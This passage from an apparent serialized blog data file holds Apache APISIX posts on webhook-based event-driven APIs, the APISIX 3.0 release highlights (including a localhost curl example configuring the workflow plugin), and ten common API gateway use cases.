in the user interface (meaning a user has to refresh a page to get the latest changes).\\n\\nInstead of having to constantly poll for changes, create a subscription endpoint against a specific resource so consuming applications can register their interest to be informed on any change of state (an event) by providing a call-back endpoint. At this point, it becomes the API\'s responsibility to send back any change of state by posting the updates to the registered endpoint.\\n\\n![poll for changes vs webhook](https://static.apiseven.com/2022/11/07/6368cda2cbae7.png)\\n\\n## What\u2019s Webhook?\\n\\nA [webhook](https://en.wikipedia.org/wiki/Webhook) is a software architecture approach that allows applications and services to submit a web-based notification to other applications whenever a specific event occurs. The application provides a way for users to register or connect API calls to certain events under specific conditions, such as when a new user, account, or order is created or an order ships out of a warehouse.\\n\\nWebhooks are generally used to notify clients of events, in real-time, as they occur. They normally take the form of HTTP POST endpoints that can be requested with a JSON body and it is fully managed by an event consumer. An event producer, such as an API server, can send event notifications to a webhook when something interesting happens.\\n\\n## Webhook and API Gateway in Event-Driven Architecture\\n\\nLeveraging Webhook and API Gateway enables you to build an event-driven API that can be decoupled from your main application code. Enabling you to call external systems that have subscribed via webhooks in complete isolation from your application code.\\n\\n![Webhook with an API Gateway](https://static.apiseven.com/2022/11/06/6367bd7b2ad1a.png)\\n\\nAs you can see in the preceding architectural diagram, there are two main flows.\\n\\n### Subscription process\\n\\nIn the first flow on the left, API Consumers can subscribe to the API by registering a Webhook URL as the callback. A consuming application subscribing for changes in a resource by making a POST call (with the call-back URL in the body) to a resource subscription API endpoint (for example, `/{resource}/subscribe`) exposed in an API gateway. Once the API gateway receives the call, it routes the request to the subscription service, which then adds the subscriber details to a database.\\n\\n![the first flow Subscription process](https://static.apiseven.com/2022/11/07/6368be4e9bba1.png)\\n\\nIt is also possible to unsubscribe from the API. In this scenario, API Gateway\u2019s tasks first identify unknown messages so be sure that the request is always authenticated and credentials are valid,  it returns a `2xx response` immediately as an acknowledgment or if the request cannot be authenticated or there is an error getting the payload into a staging system, an error is returned. Then it is also passing the request to the responsible service based on the path provided by the consumer.\\n\\n### Callback process\\n\\nIn the second flow on the right, we are delivering events to API consumers asynchronously through the call-back component and the API Gateway. An event listener service queries the database as subscribers are matched against particular processed events. The event listener service then creates call-back commands and publishes them in an Event Hub so a call-back service can execute all API calls (and retries if necessary) via the API gateway.\\n\\n![the second flow Callback process](https://static.apiseven.com/2022/11/07/6368be5603f54.png)\\n\\nThere, API Gateway plays not only a role of a reverse proxy but can convert internal calls from one format to another. For example, the call-back service is using another [AMQP](https://www.amqp.org/) (Advanced Message Queuing Protocol) messaging protocol but the API should make a REST call to the consumer\u2019s callback endpoint, in this gateway an API Gateway such as [Apache APISIX](https://apisix.apache.org/) can help. It can receive a REST request, then transform it to the desired format and forward it to a service, get the response, and return it to the client in REST format utilizing its [different plug-ins](https://apisix.apache.org/docs/apisix/plugins/response-rewrite/).\\n\\nAlso, it comes with other concerns like securing it with certificates and preventing [DDoS attacks](https://en.wikipedia.org/wiki/Denial-of-service_attack). And it enables a monitoring feature for your webhook to be able to see what is going on with the webhook, you know like what is wrong with the configuration on the API provider side.\\n\\nOne of the most efficient ways to handle the **webhook processing part** of the above architecture by using API Gateway of your choice and an event-driven serverless function.\\n\\n## Summary\\n\\nAs we understood throughout the post, Webhook tries to decouple the concerns like a message acknowledgment and the processing messages in the API and no synchronous business logic is performed. However, the above architectural example we discussed can be a complicated pattern to implement given that it has many moving parts and the API are not aware of a consuming application endpoint is up and running but that can be improved. In addition to this, Webhooks force the event consumer to establish a publicly accessible HTTP endpoint to receive events that are not secure enough. We can secure it properly by enabling some authentication mechanism (Basic auth, JWT or other ways) with the API Gateway capabilities.\\n\\n### Related resources\\n\\n\u2794 [Building event-driven API services using CQRS, API Gateway and Serverless](https://dev.to/apisix/building-event-driven-api-services-using-cqrs-api-gateway-and-serverless-af4).\\n\\n\u2794 [API Gateway](https://apisix.apache.org/docs/apisix/terminology/api-gateway/).\\n\\n### Recommended content \ud83d\udc81\\n\\n\u2794 Watch Video Tutorial:\\n\\n- [Getting Started with Apache APISIX](https://youtu.be/dUOjJkb61so).\\n  \\n- [APIs security with Apache APISIX](https://youtu.be/hMFjhwLMtQ8).\\n\\n- [Implementing resilient applications with API Gateway (Circuit breaker)](https://youtu.be/aWzo0ysH__c).\\n\\n\u2794 Read the blog posts:\\n\\n- [Implementing resilient applications with API Gateway (Health Check)](https://dev.to/apisix/implementing-resilient-applications-with-api-gateway-health-check-338c).\\n\\n- [10 most common use cases of an API Gateway](https://apisix.apache.org/blog/2022/10/27/ten-use-cases-api-gateway/)."},{"id":"Apache APISIX 3.0: 11 Highlights of Open Source API Gateway","metadata":{"permalink":"/blog/2022/11/02/apache-apisix-v3-preview","source":"@site/blog/2022/11/02/apache-apisix-v3-preview.md","title":"Apache APISIX 3.0: 11 Highlights of Open Source API Gateway","description":"The open source API Gateway Apache APISIX version 3.0 is coming! We have selected 11 essential features to give a brief overview.","date":"2022-11-02T00:00:00.000Z","formattedDate":"November 2, 2022","tags":[{"label":"Products","permalink":"/blog/tags/products"}],"readingTime":10.535,"truncated":true,"authors":[{"name":"Ming Wen","title":"Author","url":"https://github.com/moonming","image_url":"https://avatars.githubusercontent.com/u/26448043","imageURL":"https://avatars.githubusercontent.com/u/26448043"}],"prevItem":{"title":"Event-Driven APIs with Webhook and API Gateway","permalink":"/blog/2022/11/07/webhook-api-gateway-event-driven-apis"},"nextItem":{"title":"10 most common use cases of an API Gateway","permalink":"/blog/2022/10/27/ten-use-cases-api-gateway"}},"content":"> The open source API Gateway Apache APISIX version 3.0 is coming! We have selected 11 essential features to give a brief overview.\\n\\n\x3c!--truncate--\x3e\\n\\n[API Gateway](https://apisix.apache.org/docs/apisix/terminology/api-gateway/) has acted as an essential component for a long time. It has been committed to providing various functions such as [rate limiting](https://apisix.apache.org/docs/apisix/plugins/limit-req/), authentication (e.g., [Use Keycloak to secure APIs](https://apisix.apache.org/blog/2022/07/06/use-keycloak-with-api-gateway-to-secure-apis/)), and observability at the business level.\\n\\n## API Gateway Apache APISIX\\n\\n[Apache APISIX](http://github.com/apache/apisix) was born to help enterprises solve new problems in cloud-native environments and microservices. For example, it provides autoscaling of the business traffic through the fully dynamic feature and one-time modification to more conveniently achieve cluster management.\\n\\nTherefore, in the architectural design of APISIX, the data plane and the control plane are separated to achieve fully dynamic and cluster management, which is mainly accomplished by etcd components.\\n\\n![Apache APISIX  Architecture](https://static.apiseven.com/2022/09/21/632ab5bd35b73.png)\\n\\nAPISIX stores and manages routing-related and plugin-related configurations in etcd. As shown in the figure above, the configurations from [Admin API](https://apisix.apache.org/docs/apisix/admin-api/) (Control Plane) are stored in etcd, while the data plane on the left mainly monitors the changes of etcd. The data plane can quickly observe changes without needing to modify configuration files.\\n\\nBut just solving these problems is not enough. As a middleware with requests from both [upstream](https://apisix.apache.org/docs/apisix/terminology/upstream/) and downstream, the API gateway plays a crucial position in the enterprise architecture as the traffic entrance and the connection between the service layers. API gateway\'s role differs from databases that only receive requests from the user\'s business level.\\n\\nIn addition to business-level requirements, API gateways also have requirements for customization and integration. So how to make custom development easier for developers when using APISIX is another significant pain point that APISIX solves, lowering the threshold for developers to code.\\n\\nIn APISIX, plugins are developed mainly through Lua, and [LuaJIT](https://apisix.apache.org/blog/2021/08/25/why-apache-apisix-chose-nginx-and-lua/) (a Just-In-Time Compiler for Lua) is used to ensure that the compiled code performance is good enough.\\n\\nIf you are not familiar with Lua, you can use Plugin Runner, developing APISIX plugins using the programming languages you are familiar with. We also embedded [Wasm](https://apisix.apache.org/docs/apisix/wasm/) into APISIX, and you can utilize Wasm to compile Wasm bytecode to run in APISIX. As a result, users can use Lua, Go, Python, Wasm, etc., to create custom plugins on APISIX.\\n\\nThanks to APISIX\'s architecture and performance upper hand, APISIX\'s global user growth has far exceeded expectations in the three years since its inception. For example, big tech companies such as [WPS](https://apisix.apache.org/blog/2021/09/28/wps-usercase/), [Sina Weibo](https://apisix.apache.org/blog/2021/07/06/the-road-to-customization-of-sina-weibo-api-gateway-based-on-apache-apisix/), and [iQiyi](https://apisix.apache.org/blog/2021/09/07/iqiyi-usercase/) are enterprise-level users carrying tens of billions of API requests daily. In addition, scientific research institutions such as NASA and European Factory Platform are using APISIX.\\n\\n## 11 New Highlights of APISIX 3.0\\n\\nAPISIX proposed a new [3.0 Roadmap](https://github.com/apache/apisix/issues/6473) in early 2022. In version 3.0, its iterations and updates will focus on usability and the ecosystem.\\n\\n![Apache APISIX 3.0 Roadmap](https://static.apiseven.com/2022/09/22/632bd6f95717a.png)\\n\\nAPISIX 3.0 has been officially released in late October 2022. Let\'s have an overview of the exciting new highlights!\\n\\n### 1. Full Support of ARM64\\n\\nARM64 has become a very mainstream server architecture selection for cloud manufacturers. From [AWS Graviton](https://apisix.apache.org/blog/2022/06/07/installation-performance-test-of-apigateway-apisix-on-aws-graviton3/), [GCP Tau T2A](https://apisix.apache.org/blog/2022/07/22/how-is-google-cloud-tau-t2a-performing/) to Huawei Kunpeng and other products, we can see that various cloud manufacturers have begun to launch servers based on the Arm architecture. The following graph shows the stress testing performance of APISIX on popular Arm-based servers:\\n\\n![Apache APISIX Benchmark](https://static.apiseven.com/2022/09/21/632ab5beacad4.png)\\n\\nAccording to the current data, the performance of Arm-based servers is slightly better than the performance of the x86. To conform to the technological trend of the times, APISIX also did comprehensive CI regression testing on ARM64 to ensure that users can still run various functions smoothly when running APISIX in the Arm architecture.\\n\\n### 2. AI Plane\\n\\nApache APISIX adds an AI plane in the 3.0 version, improving the performance by 30% (measured by QPS under stress testing). The AI plane would dynamically optimize the data plane configuration, utilizing comprehensive data such as users\' settings on routes and plugins, as well as log metrics. For example, the following three scenarios can be automatically optimized by the AI plane:\\n\\n1. When the matching requirement is simple (e.g. only containing uri or host), cache is enabled to accelerate the route matching process\\n2. If there is no plugin, only the code related to the upstream would be run\\n3. If there is only one upstream node and no other configuration option is enabled, the upstream would be configured in a lightweight way\\n\\nThe AI plane brings new possibilities to traffic processing. In the future, an automatic warm-up of upstream services and security threat detection can all be processed through the AI plane.\\n\\n### 3. Adding gRPC Client\\n\\nIn version 3.0, Apache APISIX will support a new `core.grpc` module. However, if you are familiar with NGINX and OpenResty, you should know that their support for gRPC is pretty limited, only providing basic features like reverse proxy or load balancing.\\n\\nAPISIX has already implemented the transcode between gRPC and HTTP protocols in the current 2.x version. In version 3.0, Apache APISIX will add a new gRPC client to allow developers to directly call third-party gRPC services without introducing additional components or requiring service providers to use different HTTP interfaces, making the process much simpler.\\n\\n### 4. Redesigning Admin API\\n\\nWhen using APISIX today, you may find that the response body of APISIX is mixed with a lot of meaningless data, such as some etcd return values that are passed directly to the client without any tailoring. Also, the entire response body\u2019s architectural design is not ideal, with many redundant fields.\\n\\nIn APISIX 3.0 version, the response body\u2019s structure has been improved. In addition, the new design makes the overall request format and returns body more RESTful, making it easier for users to use the latest version of Admin API. Of course, this process also allows you to set which version of the Admin API to use through parameters, freeing users from fears of upgrading to incompatible versions.\\n\\n### 5. Data Plane(DP) and Control Plane(CP) Separation\\n\\nAPISIX has suffered several security-related vulnerabilities in the last two years. The root cause of most vulnerabilities is that the DP and the CP are deployed together in the default deployment mode. Therefore, once a security vulnerability exists on the data plane, an attacker can directly invade the CP through the DP, affecting all other DPs.\\n\\nTherefore, in version 3.0, the [deployment mode](https://apisix.apache.org/docs/apisix/next/deployment-modes/) configuration is supported, and the default deployment mode is `traditional`, where the DP and the CP are deployed together. Of course, the new deployment mode recommends that you set the attribute to data_plane or control_plane to separate them.\\n\\nWhen they are separated, not only can the security risks mentioned above be solved, but function iterations on the DP and CP are also more manageable without affecting each other.\\n\\n### 6. Improved Service Discovery Support\\n\\nIn the current version, APISIX has supported the integration of many service discovery components, such as Apache ZooKeeper, [Consul](https://apisix.apache.org/blog/2022/02/25/consul-api-gateway/), [Nacos](https://apisix.apache.org/blog/2022/02/21/nacos-api-gateway/), and so on. But at the moment, these integrations are all done on the data plane. Once you have a lot of nodes on the DP, it will put much pressure on the following service discovery components. At the same time, in the actual production environment of users, they want a simple integration like Consul KV or DNS integration and complete integration of functions such as health checks.\\n\\nTherefore, in APISIX 3.0, we added a layer of abstraction by adding a sub-project APISIX-SEED to achieve the service discovery support at the control plane level and reduce the pressure on the service discovery component.\\n\\n![Apache APISIX with Service Discovery](https://static.apiseven.com/2022/09/21/632ab5bf916e4.png)\\n\\n### 7. Adding xRPC Framework\\n\\nTCP Proxy is supported in the current version of APISIX, but there are times when a pure TCP protocol proxy is insufficient. Users need a proxy for specific application protocols, such as Redis Proxy, Kafka Proxy, etc., because some functions can only be implemented after the protocol is encoded and decoded.\\n\\nTherefore, in version 3.0, APISIX implements a transport layer protocol extension framework called xRPC that allows developers to customize specific application protocols. Based on xRPC, developers can encode and decode requests and responses through Lua codes and then realize fault injection, log reporting, and dynamic routing based on understanding the content of the protocol.\\n\\nBased on the xRPC framework, APISIX can provide proxy implementations for several mainstream application protocols. At the same time, users can also support their own private TCP-based application protocols based on this framework, enabling them to have precise granularity and higher order application layer control similar to HTTP protocol proxy. Furthermore, on top of different protocols, some common factors can be abstracted to implement related plugin features so that other protocols can share these features.\\n\\n### 8. Supporting More Observability on Transport Layer Protocols\\n\\nAPISIX has always invested heavily in observability support, supporting almost all observability components, such as [Zipkin](https://apisix.apache.org/blog/2022/02/28/apisix-integration-opentelemetry-plugin), [Apache SkyWalking](https://apisix.apache.org/blog/2021/12/07/apisix-integrate-skywalking-plugin/), [Datadog](https://apisix.apache.org/blog/2021/11/12/apisix-datadog/), and more. Various logging components are also supported, but most are carried out in the application layer.\\n\\nApache APISIX will add more transport layer observability support in 3.0. For example, the support for [Prometheus](https://apisix.apache.org/docs/apisix/plugins/prometheus/) and various logs has been added, enabling users to observe the problems of application layer traffic easily and enabling users to check the operation status of transport layer traffic.\\n\\n### 9. Integrating the OpenAPI Specification\\n\\nAPI is an element that involves the entire lifecycle of development, from designing to coding, testing, and deploying. In APISIX 3.0, Apache APISIX will support the standard OpenAPI 3.0 specification.\\n\\nTherefore, if you manage the APIs on API design and testing software, it is straightforward to manage and maintain the data in APISIX by exporting and importing it. At the same time, various APIs in APISIX can also be shipped through the OpenAPI 3.0 specification and then imported into other systems for use.\\n\\nIn addition, APISIX 3.0 also supports Postman-related custom formats (Postman Collection Format v2), enabling data transfer between the two, thus making integration easier.\\n\\n### 10. Full Support for Gateway API and Service Mesh\\n\\nSupport for the [Gateway API](https://gateway-api.sigs.k8s.io/) has begun in the [APISIX Ingress Controller](https://github.com/apache/apisix-ingress-controller/issues?q=gateway+api), and nearly all Gateway API configurations are supported in the latest 1.5 release.\\n\\nIn this case, the APISIX Ingress can be configured using the Gateway API, which means you can switch between different data planes. By the end of this year, APISIX Ingress will have complete support for the Gateway API and additional transport and application layer features.\\n\\nUnlike most service mesh solutions, APISIX\'s service mesh solution has advantages in the data plane (due to the high performance of APISIX itself). So, in selecting the control plane, we hope it will be compatible with some mainstream solutions in the community. Finally, by using the xDS protocol to integrate with Istio and writing the obtained configuration to the xDS configuration center of APISIX, the specific routing rules are generated by APISIX to complete the corresponding routing requests.\\n\\nThis solution not only makes the entire service mesh lighter but also makes custom development and migration more convenient with the high scalability of APISIX.\\n\\n### 11. Integrate with More Ecosystems\\n\\nIn addition to the OpenAPI standard mentioned above, many ecosystem plugins will be added in version 3.0, such as OpenFunction, ClickHouse, Elasticsearch, SAML, CAS, etc., to integrate more support for authentication, security, and observability.\\n\\nOne of the exciting plugins, [workflow](https://apisix.apache.org/docs/apisix/next/plugins/workflow/), is used for traffic scheduling: we can do some granular processing at the traffic control level.\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/routes/1 \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n  \\"uri\\":\\"/hello/*\\",\\n  \\"plugins\\":{\\n    \\"workflow\\":{\\n      \\"rules\\":[\\n        {\\n          \\"case\\": [\\n            [\\"uri\\", \\"==\\", \\"/hello/rejected\\"]\\n          ],\\n          \\"actions\\": [\\n            [\\n              \\"return\\",\\n              {\\"code\\": 403}\\n            ]\\n          ]\\n        },\\n        {\\n          \\"case\\": [\\n            [\\"uri\\", \\"==\\", \\"/hello/v2/appid\\"]\\n          ],\\n          \\"actions\\": [\\n            [\\n              \\"limit-count\\",\\n              {\\n                \\"count\\": 2,\\n                \\"time_window\\": 60,\\n                \\"rejected_code\\": 429\\n              }\\n            ]\\n          ]\\n        }\\n      ]\\n    }\\n  },\\n  \\"upstream\\": {\\n    \\"type\\": \\"roundrobin\\",\\n    \\"nodes\\": {\\n      \\"127.0.0.1:1980\\": 1\\n    }\\n  }\\n}\'\\n```\\n\\nFor example, perform a specific action when condition A is true, perform another action when condition B is true, etc. In this way, users can schedule various business traffic more conveniently.\\n\\n## Get Started with Apache APISIX 3.0\\n\\nYou can now check out APISIX 3.0 on the [GitHub Release page](https://github.com/apache/apisix/releases) and [Download page](https://apisix.apache.org/downloads/)!\\n\\nAPISIX has grown a lot from the beginning to the 3.0 version. An open source project may not be judged solely on performance and functionality but on the perspective of users, developers, and enterprises to consider whether they can use the product to solve their current pain points quickly and effectively.\\n\\nThe highlights and new features mentioned in this article are all created through the open source community. Apache APISIX has become more vibrant by receiving feedback from different developers and enterprise users. If you want to join the vibe, check out the community [here](https://apisix.apache.org/docs/general/join/)!"},{"id":"10 most common use cases of an API Gateway","metadata":{"permalink":"/blog/2022/10/27/ten-use-cases-api-gateway","source":"@site/blog/2022/10/27/ten-use-cases-api-gateway.md","title":"10 most common use cases of an API Gateway","description":"This post elaborates on the 10 most common usages of an API Gateway such as Apache APISIX in architecting API-Led Connectivity.","date":"2022-10-27T00:00:00.000Z","formattedDate":"October 27, 2022","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":10.735,"truncated":true,"authors":[{"name":"Bobur Umurzokov","title":"Author","url":"https://github.com/Boburmirzo","image_url":"https://avatars.githubusercontent.com/u/14247607","imageURL":"https://avatars.githubusercontent.com/u/14247607"}],"prevItem":{"title":"Apache APISIX 3.0: 11 Highlights of Open Source API Gateway","permalink":"/blog/2022/11/02/apache-apisix-v3-preview"},"nextItem":{"title":"Deploy and Run Apache APISIX on Scaleway Cloud","permalink":"/blog/2022/10/19/deploy-apisix-on-scaleway-cloud"}},"content":"> This post elaborates on the **10 most common usages** of an _API Gateway_ such as [Apache APISIX](https://apisix.apache.org/) in architecting [API-Led Connectivity](https://blogs.mulesoft.com/learn-apis/api-led-connectivity/what-is-api-led-connectivity/).  We understand different solutions where you can make use of the API Gateway capabilities to design reliable, high-performance, and simple APIs for other developers.\\n\\n\x3c!--truncate--\x3e\\n\\nHere is the summary of 10 patterns that uses the API Gateway (but not all):\\n\\n1. API Resource routing.\\n2. API Content-based routing.\\n3. API Geo-routing.\\n4. API Aggregator.\\n5. API Centralized Authentication.\\n6. API Format Conversion.\\n7. API Observability.\\n8. API Caching.\\n9. API Fault handling.\\n10. API Versioning.\\n\\n## API-Led Architecture\\n\\nFirst of all, let\u2019s revise once again these 3 terms like: **API Gateway**, **API-Led architecture**, and **API-Led Connectivity**.\\n\\n[API Gateway](https://wikitech.wikimedia.org/wiki/API_Gateway) is a _pattern_ formed by adding a layer between the client and the server that acts as a single entry point forwarding request from the client to the server. It allows all clients to access the services they want to access with a single API Gateway layer.\\n\\n[API-led](https://dzone.com/articles/mulesoft-api-led-connectivity-architectural-and-de) is an _architectural approach_ that puts APIs at the heart of communications between applications and the business capabilities they need to access, in order to consistently deliver seamless functionality across all digital channels.\\n\\n![api-led-connectivity.png](https://static.apiseven.com/2022/10/25/635783f5bb228.png)\\n\\n**API-led connectivity** refers to _the technique_ of using reusable and well-designed APIs to link data and applications which in turn it is based on **API-Led architecture**. It\u2019s _an architectural approach_ that looks at the best ways of reusing APIs to boost your innovation and move quickly in the market.  At the most basic level, API-led architecture should address things like:\\n\\n- Securing APIs from unauthorized access and significant security threats.\\n- Ensuring that consuming applications can always find the right API endpoint.\\n- Throttling and/or limiting the number of calls made to an API to ensure continuous availability.\\n- Supporting capabilities such as API design, testing, continuous integration, life cycle management, monitoring, and operations, to name a few.\\n- Error handling and preventing error propagation across the stack.\\n- Real-time monitoring of APIs with rich analytics and insight.\\n- An approach for implementing scalable and flexible business capabilities, for example, in support of microservices architectures.\\n\\nLet\u2019s describe in subsequent sections each usage of an API Gateway to address common requirements/challenges that arise when adopting API-led architectures.\\n\\n---\\n\\n## API resource routing\\n\\nThe first in the list is the **API resource routing** method which uses an API Gateway to route incoming calls based on unique resource identifiers (URIs). Implementing an API gateway as the single entry point to all services means that API consumers only have to be aware of one URL domain. In this way, it becomes the API gateway\'s responsibility to route the traffic to the corresponding service endpoints and also enforce any applied policies as it is depicted in the below diagram.\\n\\n![API resource routing](https://static.apiseven.com/2022/10/25/635788a124bf4.png)\\n\\nIt reduces complexity on the API consumer side because the client applications do not need to consume functionality from multiple HTTP endpoints in case there are many services in the system.  Also, **no need to implement all cross-cutting concerns, such as authentication/authorization, throttling, and rate limiting separately for each service**. Most API Gateways like [Apache APISIX](https://apisix.apache.org/docs/apisix/terminology/api-gateway/) has already these core features.\\n\\n## API content-based routing\\n\\nSimilarly, **API content-based** routing mechanism also uses an API gateway to route calls based on the content of a request (for example, based on the HTTP header or message body) instead of just the URI.\\n\\nTake a scenario when database sharding is applied in order to distribute the load across multiple database instances. This technique is typically applied when the overall number of records stored is huge and a single instance struggles to manage the load. Instead, records are spread across multiple database instances. Then, you implement multiple services, one per unique datastore, and adopt an API gateway as the only entry point to all services. You could then configure the API gateway to route calls to the corresponding service based on a key obtained either from the HTTP header or the payload.\\n\\n![API content-based routing](https://static.apiseven.com/2022/10/25/6357a1cc3d32c.png)\\n\\nIn the above diagram, an API gateway is exposing a single `/customers` resource for multiple customer services, each with a different data store.\\n\\n## API geo-routing\\n\\n**API geo-routing** solution routes API calls to the nearest API gateway based on where they originate.  In order to prevent latency issues and other unforeseen issues that may occur due to distance (for example, a consuming application from Asia calling an API located in North America), API gateways and other service infrastructure have been deployed in multiple regions across the world as needed. For example, using different sub-domains for each API gateway in each region and letting the consuming application determine the nearest gateway based on application logic. Then, an API gateway provides internal load balancing to make sure that incoming requests are distributed across the available instances of a service.\\n\\n![API geo-routing](https://static.apiseven.com/2022/10/25/6357afebdc9c0.png)\\n\\nAs you can see in the preceding diagram, it uses a DNS, traffic management service, and an API Gateway to resolve each subdomain against the region\u2019s load balancer and passes the client request further down to the closest API Gateway.\\n\\n## API aggregator\\n\\nThis technique performs operations (for example, queries) against multiple services and returns the result to the client service with a single `HTTP request/response` call. Instead of having a client application make several calls to multiple APIs, an API aggregator uses an API Gateway to do this on behalf of the consumer on the server side.\\n\\nFor example, consider a mobile app that makes multiple calls to different APIs to show the data for a single screen. In this case, it increases complexity in the client-side code, over-utilization of network resources, and even poor user experience as the application is more exposed to latency issues. API Gateway can accept as input all information required, does request authentication and validation, understands all data structures from all APIs that it interacts with, and is capable of transforming the response payloads so they can be sent back to the mobile app as a uniform payload needed for the consumer.\\n\\n![API geo-routing](https://static.apiseven.com/2022/10/25/6357a5017297b.png)\\n\\n## API Centralized Authentication\\n\\nIn this design, an API Gateway acts as a **centralized authentication gateway**. As an authenticator, API Gateway looks for access credentials in the `HTTP header` - for example, a bearer token, and implements business logic that validates those credentials with an IDP, identity provider such as [Okta](https://www.okta.com/), [Cognito](https://aws.amazon.com/cognito/), [Azure Active Directory](https://azure.microsoft.com/en-us/services/active-directory/) or [Ory Hydra](https://www.ory.sh/hydra/)) typically using the [OpenID Connect](https://openid.net/connect/) (OIDC) is an authentication protocol based on the [OAuth 2.0](https://oauth.net/2/) and checking whether they have access or not.\\n\\n![Header based basic authentication](https://static.apiseven.com/2022/10/25/6357b6a55569a.png)\\n\\nCentralized authentication with the API Gateway can solve many problems and have some benefits as it completely offloads user management from an application and it improves performance by responding quickly to authentication requests received from client applications.\\n\\n![identityprovider and APISIX](https://static.apiseven.com/2022/10/30/635e2933c70e4.png)\\n\\nFor example, [Apache APISIX](https://apisix.apache.org/) offers a variety of [plugins](https://apisix.apache.org/docs/apisix/plugins/openid-connect/) to enable different methods of API gateway authentication. We looked at some of the most commonly used in this blog post [Centralized Authentication with Apache APISIX Plugins](https://dev.to/apisix/centralized-authentication-with-apache-apisix-plugins-30fo). You can even enable multiple methods for authentication for the given API.\\n\\n## API Format Conversion\\n\\nThis refers to having the ability to convert payloads from one format to another over the same transport. For example, from XML/SOAP over HTTPS to JSON over HTTPS and vice versa. API Gateways, by default offer capabilities in support of REST API and some specialized API gateways support, in addition to payload conversions, transport conversions such as converting from Message Queuing Telemetry Transport (MQTT) over TCP (a very popular transport in IoT) to JSON over HTTPS.\\n\\n![gRPC Transcode plugin](https://static.apiseven.com/2022/10/30/635e29814fac2.png)\\n\\nFor example, Apache APISIX is able to receive an HTTP request, then transcode it and forwards it to a gRPC service, gets the response, and return it back to the client in HTTP format by means of its [gRPC Transcode](https://apisix.apache.org/docs/apisix/plugins/grpc-transcode/) plug-in.\\n\\n## API Observability\\n\\nBy now, we know that an API gateway offers a central control point for incoming traffic to a variety of destinations but it can also be a central point for observation as well since it is uniquely qualified to know about all the traffic moving between clients and our service networks. There is always the possibility to instrument the API gateways so observability data (structured logs, metrics, and traces) can be collected in order to use specialized monitoring tools.\\n\\nFor example, Apache APISIX provides [pre-built connectors](https://apisix.apache.org/docs/apisix/plugins/prometheus/) (plug-ins) that you can easily integrate with external monitoring tools. You can leverage these connectors to ingest log data from your API gateways to further derive useful metrics and gain complete visibility into the usage, you can manage performance, and security of your APIs in your environment. There is also a dedicated post on [how to use these observability plugins](https://medium.com/@ApacheAPISIX/api-observability-with-apache-apisix-plugins-34584dc1ce3a).\\n\\n## API Caching\\n\\n**API Caching** is yet another level of caching that is usually implemented inside API Gateway. It can reduce the number of calls made to your endpoint and also improve the latency of requests to your API by caching a response from the upstream. If the API Gateway cache has a fresh copy of the requested resource, it uses that copy to satisfy the request directly instead of making a request to the endpoint. If the cached data is not found, the request travels to the intended upstream services (backend services).\\n\\n![API Caching with APISIX Api Gateway](https://static.apiseven.com/2022/10/30/635e29c9a7656.png)\\n\\nYou can read more about [API Gateway Caching with Apache APISIX](https://medium.com/@ApacheAPISIX/api-gateway-caching-for-asp-net-core-web-api-cf24d0e598fc) in the dedicated blog post.\\n\\n## API Fault handling\\n\\nAPI services fail due to any number of reasons, such as networks issues, connection (failed to open a connection to a data source like a SQL Server database), API performance issues, or failure to authenticate to dependencies.  In such scenarios, our API services should be resilient enough to deal with predictable failures. Also, we want to be sure that any resilience mechanisms we have in place such as error handling code, [circuit breaker](https://dev.to/apisix/implementing-resilient-applications-with-api-gateway-circuit-breaker-ggk), [health checks](https://dev.to/apisix/implementing-resilient-applications-with-api-gateway-health-check-338c), [retry](https://docs.microsoft.com/en-us/azure/architecture/patterns/retry), fallback, redundant instances, and so on. Modern API Gateways support all the above error-handling features including automatic retries and timeouts.\\n\\n![API Fault handling with Apache APISIX](https://static.apiseven.com/2022/10/30/635e2a003c27f.png)\\n\\nAPI Gateway acts as an orchestrator that can use this status report to decide how to manage the traffic, load balance to a healthy node, fail-fast due to some cascading failures or simply alerts you when it notices something goes wrong. API Gateway also ensures that routing and other network-level components work together successfully to deliver a request to the API process. It helps you to detect in the early stage and fix issues for your running application much more easily. Or the [fault injection](https://apisix.apache.org/blog/2022/08/28/fault-injection-testing-with-api-gateway/) mechanism at the API Gateway level can be used to test the resiliency of application or microservices APIs against various forms of failures to build confidence in the production environment.\\n\\n## API Versioning\\n\\nThis refers to having the ability to define and run multiple concurrent versions of an API. This is particularly important as APIs will evolve over time, and having the ability to manage concurrent versions of an API will enable API consumers to incrementally switch to newer versions of an API, so older versions can be deprecated and ultimately retired. This is important as an API, just like any other software application, should be able to evolve either in support of new features or simply just in response to bug fixes.\\n\\n![API Versioning](https://static.apiseven.com/2022/10/30/635e2a3c85aa5.png)\\n\\nYou can use an API Gateway to implement API versioning (Header, Query parameter, or Path) based. [Evolving your RESTful APIs, a step-by-step approach](https://blog.frankel.ch/evolve-apis/) blog post explains how to achieve versioning by configuring two routes in the API Gateway, one versioned and the other non-versioned, switching between them by enabling [proxy-rewrite](https://apisix.apache.org/docs/apisix/plugins/proxy-rewrite/) plugin of Apache APISIX.\\n\\n## Summary\\n\\nThroughout the post, we described some of the use cases of API Gateway in designing API-Led architecture like how an API handles authentication, transformation, aggregation, caching, observability, how an API gateway can be applied in order to route access to multiple backend endpoints and so on. However, there are many other use cases one might think of.\\n\\nFor example, I explained in another blog post how to [develop API services using CQRS, API Gateway and Serverless](https://apisix.apache.org/blog/2022/09/23/build-event-driven-api/) where the API Gateway used for resource routing to route all read calls to the product\'s query service and upsert calls to the product\'s command service based on HTTP request type.\\n\\n### Related resources\\n\\n\u2794 [API Gateway](https://apisix.apache.org/docs/apisix/terminology/api-gateway/).\\n\\n\u2794 [Read book: Enterprise API Management: Design and deliver valuable business APIs](https://www.amazon.com/Enterprise-Management-Luis-Augusto-Weir/dp/1787284433).\\n\\n### Recommended content \ud83d\udc81\\n\\n\u2794 Watch Video Tutorial:\\n\\n- [Getting Started with Apache APISIX](https://youtu.be/dUOjJkb61so).\\n  \\n- [APIs security with Apache APISIX](https://youtu.be/hMFjhwLMtQ8).\\n\\n- [Implementing resilient applications with API Gateway (Circuit breaker)](https://youtu.be/aWzo0ysH__c).\\n\\n\u2794 Read the blog posts:\\n\\n- [Implementing resilient applications with API Gateway (Health Check)](https://dev.to/apisix/implementing-resilient-applications-with-api-gateway-health-check-338c).\\n\\n- [Overview of Apache APISIX API Gateway Plugins](https://dev.to/apisix/overview-of-apache-apisix-api-gateway-plugins-2m8o).\\n\\n### Community\u2935\ufe0f\\n\\n- \ud83d\ude4b [Join the Apache APISIX 